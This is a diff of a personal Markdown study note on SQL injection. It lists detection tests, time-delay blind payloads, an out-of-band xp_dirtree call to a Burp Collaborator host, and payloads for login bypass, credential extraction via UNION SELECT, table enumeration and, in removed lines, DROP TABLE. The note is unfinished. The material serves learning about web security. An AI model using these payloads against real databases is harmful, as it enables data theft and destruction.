@@ -18,34 +18,60 @@
 
 [Home](../README.md)
 
-# SQL Injection
+Todo
+- Example of out-of-bound network interactions
+- Get all tables
+- Get all columns in a table
+- Example of an SQL injection with better explanation
+- Star repo of different sql attacks
 
-How do you know the database is using SQL?
-- Error messages(Internal server error)
-	- Test inputs with `'` or `"`
-- HTTP headers or response bodies
-- Look for SQL keywords
-
-Union select sequences?
-
-```SQL
-' OR 1 = 1; DROP TABLE users; --
-
--- Comments might be # instead of --
-
-' OR 1 = 1; DROP TABLE users; #
-```
-
-Get imputed into
+# SQL Injection(SQLi)
+SQL injection allows an attacker to make unrequested queries or modifications to the database.
 
 ```SQL
 SELECT * FROM users WHERE = ' userInput ';
 ```
 
-Once you know something is vulnerable to SQL injection, How do you extract information from the database?
-- Find all the tables
-- Find all the columns in each table
+When sending request since you cannot use spaces you can use `%20` instead.
+
+## Test is the db vulnerable to SQLi
+- Look for SQL keywords in source code which may tell you what they are using.
+- Input single quote `'` and look for errors
+- Input some SQL and see how that changes the responses. Ex: `ASCII(97)`
+- Look at the response differences between `' OR 1=1; --` and `' OR 1=2; --`
+
+Blind SQL injection are sql injections where the attacker cannot see any responses(including errors) from the database.
+
+To solve this you can use
+- Payloads designed to trigger time delays. Ex: `'; WAITFOR DELAY ('0:0:20');--` or `SELECT SLEEP(20);--`
+- Out-of-bound network interactions
+	- The attacker injects SQL which triggers the database to communicate with the attacker's server.
+
 ```SQL
-' UNION SELECT NULL, NULL, NULL;
+exec master..xp_dirtree
+'//0efdymgw1o5w9inae8mg4dfrgim9ay.
+burpcollaborator.net/a'
 ```
-- If returns true then you know there are 3 columns for that table.
+
+## List of good SQL attacks
+- `' UNION SELECT username, password FROM users; --`
+- `' OR 1=1; YOUR INJECTION HERE; --`
+- On a login page
+	- `admin'--` or `administrator'--` for the username
+- Get the version of the database
+	- Oracle: `SELECT * FROM v$version`
+	- MySQL: `SELECT VERSION();`
+	- Postgres: `SELECT version();`
+	- SQL Server: `SELECT @@VERSION;`
+	- SQLite: `SELECT sqlite_version();`
+	- IBM Db2: `SELECT * FROM sysibm.sysversions;`
+- Get all tables
+	- MySQL: `SHOW TABLES;`
+	- Postgres, SQL Server: `SELECT * FROM information_schema.tables`
+	- Oracle: `SELECT table_name FROM user_tables;`
+	- SQLite: `SELECT name FROM sqlite_master WHERE type='table';`
+	- IBM Db2: 
+- Get all columns in a table
+	- 
+
+' UNION SELECT NULL, NULL, NULL;
